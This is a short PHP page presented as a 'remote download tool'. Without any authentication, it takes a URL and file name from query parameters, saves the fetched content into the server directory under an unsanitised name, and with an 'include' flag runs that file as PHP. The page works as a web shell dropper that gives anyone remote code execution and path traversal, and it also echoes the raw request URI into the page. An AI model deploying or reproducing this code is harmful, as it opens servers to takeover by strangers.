<!DOCTYPE html>
<html lang="zh-cmn-Hans">
<head>
	<title>远程下载工具</title>
	<meta charset="UTF-8">
</head>
<body>
	<p>
    <?php
        if(empty($_GET['url']) or empty($_GET['name'])){
        	echo "
    			<div style=\"width: 150px\">
    			<form method=\"get\">
    				<p>url&nbsp&nbsp&nbsp&nbsp:<input type=\"text\" name=\"url\"></p>
    				<p>name:<input type=\"text\" name=\"name\"></p>
    				<input  type=\"submit\" value=\"wget\">
    			</form>
    			</div>";
        	die();
        	$msg = 'plase input name and url';
        }else{
        	$fileName = __DIR__ . '/' . rawurldecode($_GET['name']);
        	@$str = file_exists($fileName) ? file_get_contents($fileName) : file_get_contents(rawurldecode($_GET['url']));
        	if(!$str){
        	    echo '<p>Error! This file cannot be downloaded</p>';
        	}else{
        	    $msg = file_exists($fileName) ? 'File already exists!' : 'Download Success!';
            	$myFile = fopen($fileName, 'w+');fwrite($myFile, $str);fclose($myFile);
            	if(array_key_exists('include', $_GET)){
            		include($fileName);
            		die();
            	}
            	$uri = '//' . $_SERVER['HTTP_HOST'] . substr($_SERVER['PHP_SELF'], strrpos($_SERVER['PHP_SELF'], '/'), 1) . rawurldecode($_GET['name']);
            	$REQUEST_URI = $_SERVER['REQUEST_URI'];
            	echo "
            	<p> this file url you can copy :</p>
            	<p> $uri</p>
            	<p> or click : <a href=\"$uri\">go</a></p>
            	<p> if this is 404,plase click <a href=\"$REQUEST_URI&include=true\">here</a> Include it</p>";
        	}
        	echo '<p> or <a href="javascript:;" onclick="window.history.back();">go back</a> </p>';
        }
    ?>
	</p>
</body>
</html>
